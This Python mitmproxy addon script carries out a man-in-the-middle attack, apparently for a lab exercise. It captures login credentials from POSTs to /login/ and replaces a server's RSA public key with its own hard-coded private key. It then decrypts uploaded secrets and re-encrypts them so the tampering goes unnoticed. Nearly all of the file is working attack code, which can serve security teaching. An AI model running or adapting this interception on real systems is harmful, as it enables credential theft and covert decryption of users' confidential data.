import json
from mitmproxy import ctx, http
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA

sk = RSA.import_key('''
-----BEGIN RSA PRIVATE KEY-----
MIICXQIBAAKBgQDMHVE4B2IvOUeU9p7+pF3XmvW3lqRfd1Z0Zbph5EgHbzeN2r4l
GYVP1Hb0Amn3WMmXd6M0UsAjX1LMJ5oNGKWFZg0KKDnyLY0N3QNFYIl+PNAC+dv6
sbGtJbR6efPCcHCdMJjCEPFa7sn1GS/YnHwfXuAlIOvBMV29CxFqc5gULwIDAQAB
AoGACaGuhfLPPsQ4rP5QNVrjNLvSsXWRzxFuCnMMbvcbMQKd//sc8to38LLpZA1D
G9FcPeH+2Qa4m1KxsQGDYu/RS5r69N1KZtnyXtuuxPjTpyEzxD0S8Za8njN1XQ38
LvbjPAPZ4KmkqsUTwEk6XQmvp9h3Rw7imp0ap6+HwuWKB80CQQDN/TgH811qfOTf
8osW+yKtru8YcG7ZflRIEpywLFZfwfP/Y06ppmCQxS+fMcSzs3Up6dfdqZtNnKuh
0n9rClBdAkEA/auWAbUfjoUv5XZUFhjvv7ruT6tQw/GKnFqsdpsY3UzdAYkuvChM
y/3JqKCOAc8egQcQHZRkFRHBY1TR19fd+wJBAKv+T4eL86cTi4NWID7bCFSfKTJt
xpDBg5v+Nmh/TMt9xb6ra6YJrr2Sd7Xjt0sYf660ezKxCGSgeUqP2SZGIV0CQA6H
x53tbBNT2byBHKvvXbxTztbNb2Dp8xCluP9KPxBeGMK/wueQP2Xn8acxGzFLVen6
J5gqKdlzHOq9rw94FAUCQQCSrVWx8tsFABAh3JA9fyjuilcBb3pCM5Q7hlMfNy48
ILz+vghlCCCmdSo0bWj1E4tta6CqDGJbhKoXI4lGxez0
-----END RSA PRIVATE KEY-----
'''.strip())

server_pk = None



def request(flow: http.HTTPFlow) -> None:
    # intercept credentials upon login
    #  if flow.request.pretty_url.endswith(':8000/login/') and flow.request.method == 'POST':
    if flow.request.path == '/login/' and flow.request.method == 'POST':
        if flow.request.urlencoded_form:
            username = flow.request.urlencoded_form['username']
            password = flow.request.urlencoded_form['password']
            ctx.log.alert(f'intercepted credentials: {username=} {password=}')
    # decrypt uploaded data using our secret key
    elif flow.request.path == '/upload_secrets/' and flow.request.method == 'POST':
        if flow.request.urlencoded_form:
            ciphertext = bytes.fromhex(flow.request.urlencoded_form['ciphertext'])
            cipher = PKCS1_OAEP.new(sk)
            secret = cipher.decrypt(ciphertext)
            ctx.log.alert(f'decrypted secret: {secret}')
            # reencrypt data with server's public key s.t. nothing will be noticed
            if server_pk is not None:
                cipher = PKCS1_OAEP.new(server_pk)
                new_ciphertext = cipher.encrypt(secret)
                flow.request.urlencoded_form['ciphertext'] = new_ciphertext.hex()


def response(flow: http.HTTPFlow) -> None:
    global server_pk
    # save server's public key and replace it with our own
    if flow.request.path == '/pk/' and flow.request.method == 'GET':
        server_pk = RSA.import_key(flow.response.content)
        flow.response = http.Response.make(
            200,
            sk.public_key().export_key().decode(),
            {'content-type': 'text/plain'},
        )
    elif flow.request.path == '/pk_json/' and flow.request.method == 'GET':
        j = json.loads(flow.response.content)
        server_pk = RSA.construct((j['N'], j['e']))
        flow.response = http.Response.make(
            200,
            json.dumps({'N': sk.n, 'e': sk.e}),
            {'content-type': 'application/json'},
        )
